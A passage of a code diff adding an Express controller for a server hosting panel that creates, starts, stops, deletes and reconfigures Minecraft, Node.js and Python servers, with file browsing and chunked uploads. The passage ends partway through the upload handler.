@@ -1,0 +1,2078 @@
+import { Request, Response } from "express";
+import { readJSON, writeJSON } from "../services/db.js";
+import {
+  createServerRuntime,
+  startServerRuntime,
+  stopServerRuntime,
+  restartServerRuntime,
+  killServerRuntime,
+  deleteServerRuntime,
+  getServerRuntimeStatus,
+  getServerRuntimeStats,
+  sendServerRuntimeCommand,
+  attachServerRuntimeSocket
+} from "../services/runtime.js";
+import { getLocalProcessInfo } from "../services/local.js";
+import { createSftpUser, deleteSftpUser } from "../services/sftp.js";
+import { downloadJar } from "../services/jarDownloader.js";
+import { getJavaVersionForMinecraft } from "../../utils/minecraftJava.js";
+import { isSandbox, isNodeSandbox, checkNodeSandbox } from "../services/docker.js";
+import crypto from "crypto";
+import fs from "fs-extra";
+import path from "path";
+import { ZipArchive } from "archiver";
+import extract from "extract-zip";
+import { extractArchive } from "../utils/extract.js";
+
+const serverOperationLocks = new Set<string>();
+
+export const getServers = async (req: Request, res: Response) => {
+  const user = (req as any).user;
+  const servers = await readJSON("servers.json") || [];
+  
+  // Filter for normal users
+  const userServers = user.role === "admin" || user.role === "owner" ? servers : servers.filter((s: any) => s.owner === user.id);
+
+  // Update statuses
+  const updatedServers = await Promise.all(userServers.map(async (server: any) => {
+    if (server.containerId) {
+      const status = await getServerRuntimeStatus(server);
+      const isRunning = !!status?.State?.Running;
+      server.status = isRunning ? "online" : "offline";
+      server.startedAt = isRunning ? (status?.State?.StartedAt || server.startedAt || new Date().toISOString()) : null;
+      if (server.runtimeType === 'local') {
+          const info = getLocalProcessInfo(server.id);
+          if (info) {
+              server.pid = info.pid;
+              server.jarPath = info.jarPath;
+              server.logPath = info.logPath;
+          }
+      }
+    }
+    return server;
+  }));
+
+  res.json(updatedServers);
+};
+
+export const getServer = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+  const servers = await readJSON("servers.json") || [];
+  const server = servers.find((s: any) => s.id === id);
+  if (!server) {
+    res.status(404).json({ error: "Server not found" });
+    return;
+  }
+  if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+
+  const status = await getServerRuntimeStatus(server);
+  const isRunning = !!status?.State?.Running;
+  server.status = isRunning ? "online" : "offline";
+  server.startedAt = isRunning ? (status?.State?.StartedAt || server.startedAt || new Date().toISOString()) : null;
+  if (server.runtimeType === 'local') {
+      const info = getLocalProcessInfo(server.id);
+      if (info) {
+          server.pid = info.pid;
+          server.jarPath = info.jarPath;
+          server.logPath = info.logPath;
+      }
+  }
+  res.json(server);
+};
+
+export const getServerStats = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+  const servers = await readJSON("servers.json") || [];
+  const server = servers.find((s: any) => s.id === id);
+  if (!server) {
+    res.status(404).json({ error: "Server not found" });
+    return;
+  }
+  if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+
+  const status = await getServerRuntimeStatus(server);
+  const isRunning = !!status?.State?.Running;
+  const startedAt = isRunning ? (status?.State?.StartedAt || server.startedAt || null) : null;
+  let uptimeSeconds = 0;
+  if (isRunning && startedAt) {
+    const startedMs = new Date(startedAt).getTime();
+    if (!isNaN(startedMs) && startedMs > 0) {
+      uptimeSeconds = Math.max(0, Math.floor((Date.now() - startedMs) / 1000));
+    }
+  }
+
+  if (server.containerId) {
+    const stats = await getServerRuntimeStats(server);
+    res.json({
+      ...stats,
+      isRunning,
+      status: isRunning ? "online" : "offline",
+      startedAt,
+      uptimeSeconds,
+      limitRam: server.ram ? server.ram * 1024 : 1024,
+      limitCpu: server.cpu || 100,
+      limitDisk: server.disk || 10
+    });
+  } else {
+    res.json({
+      cpu: 0,
+      ram: 0,
+      disk: 0,
+      isRunning: false,
+      status: "offline",
+      startedAt: null,
+      uptimeSeconds: 0,
+      limitRam: server.ram ? server.ram * 1024 : 1024,
+      limitCpu: server.cpu || 100,
+      limitDisk: server.disk || 10
+    });
+  }
+};
+
+export const checkPort = async (req: Request, res: Response) => {
+  const { port } = req.query;
+  if (!port) return res.status(400).json({ error: "Port is required" });
+  
+  const servers = await readJSON("servers.json") || [];
+  const inUse = servers.some((s: any) => s.port == port);
+  
+  res.json({ inUse });
+};
+
+// Simple in-memory mutex to prevent race conditions on server creation
+let isCreatingServer = false;
+
+export const createServer = async (req: Request, res: Response) => {
+  if (isCreatingServer) {
+    return res.status(409).json({ error: "Server creation in progress, please try again in a few seconds." });
+  }
+  isCreatingServer = true;
+  try {
+  const user = (req as any).user;
+  if (user.role !== "admin" && user.role !== "owner") {
+    return res.status(403).json({ error: "Only admins can create servers" });
+  }
+  let { name, ram, port, version, theme, cpu, disk, owner, ownerId, ipAlias, type, nodeId, runtimeType, javaVersion } = req.body;
+  const settings = await readJSON("settings.json") || {};
+  const isDevPanel = (process.env.PANEL_TYPE === "dev" || process.env.PORT === "3000") && !process.env.FORCE_MAIN_PANEL;
+  if (!isDevPanel) {
+    // If running on Main Panel, enforce the locked default runtime configured at installation
+    runtimeType = settings.defaultRuntime || "docker";
+  }
+  if (!name || !ram || !port) {
+    res.status(400).json({ error: "Missing required fields (name, ram, port)" });
+    return;
+  }
+
+  const id = crypto.randomUUID();
+  const serverData = {
+    id,
+    name,
+    owner: owner || ownerId || user.id, // Support assigning owner at creation
+    ram,
+    cpu: cpu || 100,
+    disk: disk || 10,
+    port,
+    ipAlias: ipAlias || "",
+    runtimeType: runtimeType || "docker",
+    nodeId: nodeId || "local",
+    type: type || "PAPER",
+    version: version || "26.3",
+    javaVersion: javaVersion || "",
+    theme: theme || "default",
+    status: "installing",
+    createdAt: new Date().toISOString(),
+    containerId: null as string | null,
+  };
+
+  const servers = await readJSON("servers.json") || [];
+  
+  if (servers.find((s: any) => s.port == port)) {
+    res.status(400).json({ error: "Port is already in use by another server." });
+    return;
+  }
+
+  servers.push(serverData);
+  await writeJSON("servers.json", servers);
+
+  // Pre-seed files for Node.js and Python applications
+  try {
+    const serverDir = path.join(process.cwd(), ".data", "servers", id);
+    await fs.ensureDir(serverDir);
+    const upperType = (type || "PAPER").toUpperCase();
+    if (upperType === "NODEJS" || upperType === "NODE") {
+      const indexPath = path.join(serverDir, "index.js");
+      const pkgPath = path.join(serverDir, "package.json");
+      if (!fs.existsSync(indexPath)) {
+        await fs.writeFile(indexPath, `// Node.js Application on Proto Panel\nconst http = require('http');\nconst port = process.env.PORT || process.env.SERVER_PORT || ${port};\n\nconsole.log('==============================================');\nconsole.log('🚀 Node.js Application Running on port ' + port);\nconsole.log('Node Version: ' + process.version);\nconsole.log('Upload your files in File Manager to customize!');\nconsole.log('==============================================');\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'Content-Type': 'application/json' });\n  res.end(JSON.stringify({\n    status: 'online',\n    runtime: 'node.js',\n    time: new Date().toISOString()\n  }));\n});\n\nserver.listen(port, '0.0.0.0', () => {\n  console.log(\`[Server] Listening on http://0.0.0.0:\${port}\`);\n});\n`);
+      }
+      if (!fs.existsSync(pkgPath)) {
+        await fs.writeFile(pkgPath, JSON.stringify({
+          name: name.toLowerCase().replace(/[^a-z0-9_-]/g, '-') || "node-app",
+          version: "1.0.0",
+          description: "Node.js application hosted on Proto Panel",
+          main: "index.js",
+          scripts: {
+            "start": "node index.js"
+          },
+          dependencies: {}
+        }, null, 2));
+      }
+    } else if (upperType === "PYTHON" || upperType === "PYTHON3") {
+      const mainPath = path.join(serverDir, "main.py");
+      const reqPath = path.join(serverDir, "requirements.txt");
+      if (!fs.existsSync(mainPath)) {
+        await fs.writeFile(mainPath, `# Python Application on Proto Panel\nimport os\nimport sys\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nport = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", ${port})))\n\nprint("==============================================", flush=True)\nprint("🐍 Python Application Running", flush=True)\nprint(f"Python Version: {sys.version}", flush=True)\nprint(f"Listening Port: {port}", flush=True)\nprint("Upload your files in File Manager to customize!", flush=True)\nprint("==============================================", flush=True)\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(b'{"status": "online", "runtime": "python"}')\n\n    def log_message(self, format, *args):\n        print(f"[{self.log_date_time_string()}] {format % args}", flush=True)\n\nserver = HTTPServer(('0.0.0.0', port), RequestHandler)\nprint(f"[Server] Listening on http://0.0.0.0:{port}", flush=True)\n\ntry:\n    server.serve_forever()\nexcept KeyboardInterrupt:\n    print("\\nStopping server...", flush=True)\n    server.server_close()\n`);
+      }
+      if (!fs.existsSync(reqPath)) {
+        await fs.writeFile(reqPath, "# Add python dependencies here\n");
+      }
+    } else {
+      // Minecraft Server Pre-seeding
+      const eulaPath = path.join(serverDir, "eula.txt");
+      if (!fs.existsSync(eulaPath)) {
+        await fs.writeFile(eulaPath, "eula=true\n");
+      }
+      const propsPath = path.join(serverDir, "server.properties");
+      if (!fs.existsSync(propsPath)) {
+        // SECURITY FIX: RCON password is now random (was hardcoded "admin").
+        await fs.writeFile(propsPath, `server-port=${port}\nquery.port=${port}\nenable-rcon=true\nrcon.port=${parseInt(port) + 10}\nrcon.password=${crypto.randomBytes(8).toString("hex")}\nmotd=A Minecraft Server on Proto Panel\n`);
+      }
+      const jarPath = path.join(serverDir, "server.jar");
+      if (!fs.existsSync(jarPath)) {
+        try {
+          console.log(`[createServer] Downloading initial server.jar for ${name} (${upperType} ${version})...`);
+          await downloadJar(upperType, version || "26.2", jarPath);
+        } catch (dlErr: any) {
+          console.warn("[createServer] Initial jar download deferred to background:", dlErr.message);
+        }
+      }
+    }
+  } catch (seedErr) {
+    console.warn("Failed to pre-seed starter files:", seedErr);
+  }
+
+  try {
+    const containerId = await createServerRuntime(serverData);
+    serverData.containerId = containerId;
+    serverData.status = "offline";
+    await writeJSON("servers.json", Object.assign(servers, servers.map((s:any)=>s.id===id?serverData:s)));
+    await createSftpUser(id).catch(e => console.error("SFTP user creation failed:", e));
+    res.json(serverData);
+  } catch (err: any) {
+    console.error(err);
+    res.status(500).json({ error: err.message });
+  }
+  } finally {
+    isCreatingServer = false;
+  }
+};
+
+export const updateOwner = async (req: Request, res: Response) => {
+  const user = (req as any).user;
+  if (user.role !== "admin" && user.role !== "owner") {
+    return res.status(403).json({ error: "Only admins can update owner" });
+  }
+
+  const { id } = req.params;
+  const { owner } = req.body;
+
+  if (!owner) return res.status(400).json({ error: "Owner required" });
+
+  const servers = await readJSON("servers.json") || [];
+  const server = servers.find((s: any) => s.id === id);
+
+  if (!server) return res.status(404).json({ error: "Server not found" });
+
+  server.owner = owner;
+  await writeJSON("servers.json", servers);
+  
+  res.json({ success: true });
+};
+
+export const updateIpAlias = async (req: Request, res: Response) => {
+  const user = (req as any).user;
+  const { id } = req.params;
+  const { ipAlias } = req.body;
+
+  const servers = await readJSON("servers.json") || [];
+  const server = servers.find((s: any) => s.id === id);
+
+  if (!server) return res.status(404).json({ error: "Server not found" });
+
+  if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+
+  server.ipAlias = ipAlias;
+  await writeJSON("servers.json", servers);
+  
+  res.json({ success: true });
+};
+
+export const deleteServer = async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const user = (req as any).user;
+    
+    let servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    
+    if (!server) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner") {
+      return res.status(403).json({ error: "Only admins can delete servers" });
+    }
+
+    if (server.containerId) {
+      await deleteServerRuntime(server);
+    }
+    
+    servers = servers.filter((s: any) => s.id !== id);
+    await writeJSON("servers.json", servers);
+    
+    // Remove files
+    const serverDir = path.join(process.cwd(), ".data", "servers", id);
+    try {
+      await fs.remove(serverDir);
+    } catch (e) {
+      console.error("Failed to remove server directory", e);
+    }
+    
+    await deleteSftpUser(id).catch(e => console.error("SFTP user deletion failed:", e));
+    
+    res.json({ success: true });
+  } catch (err: any) {
+    console.error(err);
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const startServer = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+
+  if (serverOperationLocks.has(id)) {
+    return res.status(409).json({ error: "Another operation is already in progress on this server. Please wait." });
+  }
+  serverOperationLocks.add(id);
+
+  try {
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Forbidden: You do not have permission to manage this server" });
+    }
+
+    if (server.suspended) {
+      return res.status(403).json({ error: "Server is suspended" });
+    }
+
+    // Check if already running
+    const currentStatus = await getServerRuntimeStatus(server);
+    if (currentStatus?.State?.Running) {
+      return res.json({ success: true, message: "Server is already running", startedAt: server.startedAt });
+    }
+
+    const serverDir = path.join(process.cwd(), ".data", "servers", server.id);
+    await fs.ensureDir(serverDir);
+
+    // If server has a mock container ID or missing container ID, and Docker is now enabled, recreate real container
+    const isMockId = !server.containerId || server.containerId.startsWith("mock-container-id-");
+    const isSandboxTarget = await checkNodeSandbox(server.nodeId);
+    if (server.runtimeType !== "local" && isMockId && !isSandboxTarget) {
+      console.log(`[startServer] Server ${server.id} has mock container ID. Creating real Docker container...`);
+      server.containerId = await createServerRuntime(server);
+      await writeJSON("servers.json", servers);
+    } else if (!server.containerId) {
+      server.containerId = await createServerRuntime(server);
+      await writeJSON("servers.json", servers);
+    }
+
+    // Ensure server.jar is present for Minecraft servers before boot
+    const upperType = (server.type || "PAPER").toUpperCase();
+    if (!["NODEJS", "NODE", "PYTHON", "PYTHON3"].includes(upperType)) {
+      const jarPath = path.join(serverDir, "server.jar");
+      if (!fs.existsSync(jarPath)) {
+        try {
+          console.log(`[startServer] server.jar missing for ${server.name || server.id}. Downloading now...`);
+          await downloadJar(server.type || "paper", server.version || "26.2", jarPath);
+        } catch (dlErr: any) {
+          console.warn(`[startServer] JAR pre-download warning: ${dlErr.message}`);
+        }
+      }
+    }
+    
+    // PRE-FLIGHT CHECKS
+    try {
+      // 1. Check for stale session locks and remove them if server is stopped
+      const lockFiles = [
+        path.join(serverDir, "world", "session.lock"),
+        path.join(serverDir, "world_nether", "session.lock"),
+        path.join(serverDir, "world_the_end", "session.lock")
+      ];
+      for (const lockFile of lockFiles) {
+        if (await fs.pathExists(lockFile)) {
+          try {
+            await fs.remove(lockFile);
+          } catch (e) {
+            return res.status(500).json({ error: `Startup Pre-flight Failed: Unable to clean stale ${path.basename(lockFile)}` });
+          }
+        }
+      }
+      
+      // 2. Check permissions on server folder
+      await fs.access(serverDir, fs.constants.R_OK | fs.constants.W_OK);
+    } catch (preflightErr: any) {
+      console.error("Pre-flight check warning:", preflightErr.message);
+    }
+
+    const io = req.app.get("io");
+    if (io) io.to(`server_${id}`).emit("clear_logs");
+    
+    try {
+      await startServerRuntime(server);
+    } catch (startErr: any) {
+      const startErrMsg = String(startErr?.message || startErr);
+      if (startErrMsg.includes("ECONNREFUSED") || startErrMsg.includes("docker.sock")) {
+        console.warn(`Docker daemon unreachable on /var/run/docker.sock (${startErrMsg}). Reverting server ${server.id} to fallback runtime.`);
+        server.containerId = "mock-container-id-" + server.id;
+        await writeJSON("servers.json", servers);
+        await startServerRuntime(server);
+      } else if (startErr.statusCode === 404 || (startErr.message && startErr.message.toLowerCase().includes("no such container"))) {
+        console.log(`Container missing for server ${server.id}. Recreating...`);
+        server.containerId = await createServerRuntime(server);
+        await startServerRuntime(server);
+      } else {
+        throw startErr;
+      }
+    }
+
+    // REAL RUNTIME VERIFICATION
+    const verifiedStatus = await getServerRuntimeStatus(server);
+    if (!verifiedStatus?.State?.Running) {
+      server.status = "offline";
+      server.startedAt = null;
+      await writeJSON("servers.json", servers);
+      return res.status(500).json({ error: "Server process failed to remain running after start. Check server console for logs." });
+    }
+
+    server.status = "online";
+    server.startedAt = verifiedStatus.State.StartedAt || new Date().toISOString();
+    await writeJSON("servers.json", servers);
+
+    await attachServerRuntimeSocket(server, server.id);
+    if (io) io.to(`server_${id}`).emit("status_change", { status: "online", startedAt: server.startedAt });
+
+    res.json({ success: true, startedAt: server.startedAt });
+  } catch (err: any) {
+    console.error("Start server error:", err);
+    res.status(500).json({ error: err.message || "Failed to start server" });
+  } finally {
+    serverOperationLocks.delete(id);
+  }
+};
+
+export const stopServer = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+
+  if (serverOperationLocks.has(id)) {
+    return res.status(409).json({ error: "Another operation is already in progress on this server. Please wait." });
+  }
+  serverOperationLocks.add(id);
+
+  try {
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server || !server.containerId) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Forbidden: You do not have permission to manage this server" });
+    }
+
+    try {
+      await stopServerRuntime(server);
+    } catch (stopErr: any) {
+      if (stopErr.statusCode === 404 || (stopErr.message && stopErr.message.toLowerCase().includes("no such container"))) {
+        console.log(`Container already missing for server ${server.id}. Assuming stopped.`);
+      } else {
+        throw stopErr;
+      }
+    }
+
+    // Verify server actually stopped; if lingering, force terminate
+    const postStopStatus = await getServerRuntimeStatus(server);
+    if (postStopStatus?.State?.Running) {
+      await killServerRuntime(server);
+    }
+
+    server.status = "offline";
+    server.startedAt = null;
+    await writeJSON("servers.json", servers);
+
+    const io = req.app.get("io");
+    if (io) io.to(`server_${id}`).emit("status_change", { status: "offline", startedAt: null });
+
+    res.json({ success: true });
+  } catch (err: any) {
+    console.error("Stop server error:", err);
+    res.status(500).json({ error: err.message || "Failed to stop server" });
+  } finally {
+    serverOperationLocks.delete(id);
+  }
+};
+
+export const killServer = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+
+  if (serverOperationLocks.has(id)) {
+    return res.status(409).json({ error: "Another operation is already in progress on this server." });
+  }
+  serverOperationLocks.add(id);
+
+  try {
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Forbidden: You do not have permission to manage this server" });
+    }
+
+    await killServerRuntime(server);
+    server.status = "offline";
+    server.startedAt = null;
+    await writeJSON("servers.json", servers);
+
+    const io = req.app.get("io");
+    if (io) io.to(`server_${id}`).emit("status_change", { status: "offline", startedAt: null });
+
+    res.json({ success: true, message: "Server forcefully killed" });
+  } catch (err: any) {
+    console.error("Kill server error:", err);
+    res.status(500).json({ error: err.message || "Failed to kill server" });
+  } finally {
+    serverOperationLocks.delete(id);
+  }
+};
+
+export const restartServer = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const user = (req as any).user;
+
+  if (serverOperationLocks.has(id)) {
+    return res.status(409).json({ error: "Another operation is already in progress on this server. Please wait." });
+  }
+  serverOperationLocks.add(id);
+
+  try {
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server || !server.containerId) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Forbidden: You do not have permission to manage this server" });
+    }
+
+    // Step 1: STOP
+    try {
+      await stopServerRuntime(server);
+    } catch (e) {}
+
+    // Step 2: WAIT UNTIL ACTUALLY STOPPED
+    let isStopped = false;
+    for (let i = 0; i < 20; i++) {
+      const status = await getServerRuntimeStatus(server);
+      if (!status?.State?.Running) {
+        isStopped = true;
+        break;
+      }
+      await new Promise(r => setTimeout(r, 200));
+    }
+    if (!isStopped) {
+      await killServerRuntime(server);
+    }
+
+    server.status = "offline";
+    server.startedAt = null;
+    await writeJSON("servers.json", servers);
+
+    // Step 3: START
+    const io = req.app.get("io");
+    if (io) io.to(`server_${id}`).emit("clear_logs");
+
+    await startServerRuntime(server);
+
+    // Step 4: WAIT UNTIL ACTUALLY RUNNING & VERIFY
+    const verifiedStatus = await getServerRuntimeStatus(server);
+    if (!verifiedStatus?.State?.Running) {
+      server.status = "offline";
+      server.startedAt = null;
+      await writeJSON("servers.json", servers);
+      return res.status(500).json({ error: "Server failed to start during restart." });
+    }
+
+    server.status = "online";
+    server.startedAt = verifiedStatus.State.StartedAt || new Date().toISOString();
+    await writeJSON("servers.json", servers);
+
+    await attachServerRuntimeSocket(server, server.id);
+    if (io) io.to(`server_${id}`).emit("status_change", { status: "online", startedAt: server.startedAt });
+
+    res.json({ success: true, startedAt: server.startedAt });
+  } catch (err: any) {
+    console.error("Restart server error:", err);
+    res.status(500).json({ error: err.message || "Failed to restart server" });
+  } finally {
+    serverOperationLocks.delete(id);
+  }
+};
+
+export const sendCommand = async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { command } = req.body;
+    const user = (req as any).user;
+
+    const servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    if (!server || !server.containerId) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Forbidden: You do not have permission to send commands to this server" });
+    }
+
+    await sendServerRuntimeCommand(server, command);
+    res.json({ success: true });
+  } catch (err: any) {
+    console.error("Command error:", err);
+    res.status(500).json({ error: err.message || "Failed to send command" });
+  }
+};
+
+export const changeServerVersion = async (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { version, type, javaVersion, dockerImage, serverJar, startupCommand } = req.body;
+    const user = (req as any).user;
+    
+    if (!version) return res.status(400).json({ error: "Version is required" });
+    
+    let servers = await readJSON("servers.json") || [];
+    const server = servers.find((s: any) => s.id === id);
+    
+    if (!server) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Only admins or owners can change version" });
+    }
+
+    if (server.containerId) {
+      const status = await getServerRuntimeStatus(server);
+      if (status?.State?.Running) {
+        return res.status(400).json({ error: "Server must be stopped before changing version. Please stop the server first." });
+      }
+      // Delete old container
+      await deleteServerRuntime(server);
+    }
+    
+    // Automatically delete config files and clean binary caches to avoid issues when switching versions/types
+    const serverDir = path.join(process.cwd(), ".data", "servers", id);
+    const oldVersion = server.version;
+    const effectiveSoftware = (type || server.type || "PAPER").toUpperCase();
+    const isGeneric = ["NODEJS", "NODE", "PYTHON", "PYTHON3"].includes(effectiveSoftware);
+
+    // Safely create an automatic backup before version switch so no data is ever lost
+    try {
+      const backupsDir = path.join(process.cwd(), ".data", "backups", id);
+      await fs.ensureDir(backupsDir);
+      const preBackupZip = path.join(backupsDir, `pre-version-${oldVersion || "old"}-${Date.now()}.zip`);
+      const output = fs.createWriteStream(preBackupZip);
+      const archive = new ZipArchive({ zlib: { level: 6 } });
+      archive.pipe(output);
+      archive.directory(serverDir, false);
+      await archive.finalize();
+    } catch (bErr) {
+      console.warn("[changeServerVersion] Pre-switch backup deferred:", bErr);
+    }
+
+    // Auto-resolve or validate recommended Java version for Minecraft
+    if (!isGeneric) {
+      const recommendedJava = getJavaVersionForMinecraft(version, effectiveSoftware);
+      const prevAutoJava = getJavaVersionForMinecraft(oldVersion, server.type);
+      // If javaVersion was omitted, empty, or matched the previous auto-detected Java (e.g. was 25 for 26.x), update to recommendedJava!
+      if (!javaVersion || javaVersion === "" || javaVersion === prevAutoJava || (oldVersion?.startsWith("26") && !version.startsWith("26") && javaVersion === "25")) {
+        server.javaVersion = recommendedJava;
+      } else {
+        server.javaVersion = javaVersion;
+      }
+    } else if (javaVersion !== undefined) {
+      server.javaVersion = javaVersion;
+    }
+
+    // Clean up outdated binary caches and remapped libraries from previous versions
+    const cleanupDirs = [
+      path.join(serverDir, "cache"),
+      path.join(serverDir, ".paper-remapped"),
+      path.join(serverDir, "libraries"),
+      path.join(serverDir, "patches")
+    ];
+    for (const d of cleanupDirs) {
+      try {
+        if (await fs.pathExists(d)) {
+          await fs.remove(d);
+        }
+      } catch (e) {}
+    }
+
+    // Safe Downgrade: If switching from 26.x to 1.21.x or lower, higher-version level.dat has incompatible dimension format
+    // Archive world to world_archive_... so Paper doesn't crash on "No key dimensions in MapLike"
+    const isDowngradingFrom26 = Boolean(oldVersion && oldVersion.startsWith("26") && !version.startsWith("26"));
+    const worldDir = path.join(serverDir, "world");
+    const levelDatPath = path.join(worldDir, "level.dat");
+
+    if (isDowngradingFrom26 && await fs.pathExists(levelDatPath)) {
+      console.log(`[changeServerVersion] Downgrade detected from 26.x to ${version}. Archiving incompatible world data to prevent crash...`);
+      const ts = Date.now();
+      const worldArchiveDir = path.join(serverDir, `world_archive_${oldVersion}_${ts}`);
+      try {
+        await fs.move(worldDir, worldArchiveDir);
+        const netherDir = path.join(serverDir, "world_nether");
+        if (await fs.pathExists(netherDir)) {
+          await fs.move(netherDir, path.join(serverDir, `world_nether_archive_${oldVersion}_${ts}`)).catch(() => {});
+        }
+        const endDir = path.join(serverDir, "world_the_end");
+        if (await fs.pathExists(endDir)) {
+          await fs.move(endDir, path.join(serverDir, `world_the_end_archive_${oldVersion}_${ts}`)).catch(() => {});
+        }
+      } catch (mvErr) {
+        console.warn("[changeServerVersion] World archive warning:", mvErr);
+      }
+    }
+
+    const filesToDelete = [
+      "paper-global.yml", "paper-world-defaults.yml", "paper.yml",
+      "config/paper-global.yml", "config/paper-world-defaults.yml",
+      "spigot.yml", "bukkit.yml",
+      "world/data/random_sequences.dat", "world/session.lock"
+    ];
+    
+    for (const file of filesToDelete) {
+      const filePath = path.join(serverDir, file);
+      try {
+        if (await fs.pathExists(filePath)) {
+          await fs.remove(filePath);
+        }
+      } catch (e) {
+        console.error(`Failed to delete ${file}`, e);
+      }
+    }
+    
+    server.version = version;
+    if (type) {
+      server.type = type;
+    }
+    if (dockerImage !== undefined) {
+      server.dockerImage = dockerImage;
+    }
+    if (serverJar !== undefined) {
+      server.serverJar = serverJar;
+    }
+    if (startupCommand !== undefined) {
+      server.startupCommand = startupCommand;
+    }
+
+    // When changing version for Minecraft servers, download the new JAR
+    const upperType = (server.type || type || "PAPER").toUpperCase();
+    if (!["NODEJS", "NODE", "PYTHON", "PYTHON3"].includes(upperType)) {
+      const jarPath = path.join(serverDir, "server.jar");
+      try {
+        console.log(`[changeServerVersion] Downloading new server.jar for ${server.name || id} (${upperType} ${version})...`);
+        await downloadJar(type || server.type || "paper", version, jarPath);
+      } catch (dlErr: any) {
+        console.warn(`[changeServerVersion] Jar download warning during version switch: ${dlErr.message}`);
+      }
+    }
+
+    // Recreate container with new version env
+    const newContainerId = await createServerRuntime(server);
+    server.containerId = newContainerId;
+    
+    await writeJSON("servers.json", servers);
+    
+    res.json({ success: true, version, type: server.type });
+  } catch (err: any) {
+    console.error("Change version error", err);
+    res.status(500).json({ error: err.message });
+  }
+};
+
+const checkServerFileAccess = async (req: Request, res: Response): Promise<boolean> => {
+  const { id } = req.params;
+  const user = (req as any).user;
+  const servers = await readJSON("servers.json") || [];
+  const server = servers.find((s: any) => s.id === id);
+  if (!server) {
+    res.status(404).json({ error: "Server not found" });
+    return false;
+  }
+  if (user && user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+    res.status(403).json({ error: "Forbidden: Access denied to this server's files" });
+    return false;
+  }
+  return true;
+};
+
+// File manager basics
+export const getFiles = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const dirPath = req.query.path ? String(req.query.path) : "/";
+  const targetPath = path.join(process.cwd(), ".data", "servers", id, dirPath);
+  
+  if (!targetPath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    const stats = await fs.stat(targetPath).catch(() => null);
+    if (!stats) {
+      // Return empty if not found
+      return res.json([]);
+    }
+    if (stats.isFile()) {
+       const content = await fs.readFile(targetPath, "utf-8");
+       return res.json({ isFile: true, content });
+    }
+    const files = await fs.readdir(targetPath, { withFileTypes: true });
+    res.json(files.map(f => ({
+      name: f.name,
+      isDirectory: f.isDirectory(),
+      size: f.isDirectory() ? 0 : fs.statSync(path.join(targetPath, f.name)).size
+    })));
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
+
+
+export const uploadChunk = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id } = req.params;
+  const { uploadId, chunkIndex, fileName, path: dirPath } = req.body;
+  
+  if (!req.file || !uploadId || chunkIndex === undefined || !fileName) {
+    return res.status(400).json({ error: "Missing parameters" });
+  }
+
+  const targetPath = path.join(process.cwd(), ".data", "servers", id, dirPath || "/");
+  const partFilePath = path.join(targetPath, fileName + '.part');
+
+  if (!partFilePath.startsWith(path.join(process.cwd(), ".data", "servers", id))) {
+    return res.status(403).json({ error: "Invalid path" });
+  }
+
+  try {
+    await fs.ensureDir(targetPath);
+    
+    // If it's the first chunk, ensure we start fresh
+    if (String(chunkIndex) === "0") {
+      if (fs.existsSync(partFilePath)) {
+        await fs.remove(partFilePath);
+      }
+    }
+
+    // Read the uploaded chunk and append it
+    const chunkData = await fs.readFile(req.file.path);
+    await fs.appendFile(partFilePath, chunkData);
+    
+    // Cleanup multer temp file
+    await fs.remove(req.file.path).catch(() => {});
+    
+    res.json({ success: true });
+  } catch (err: any) {
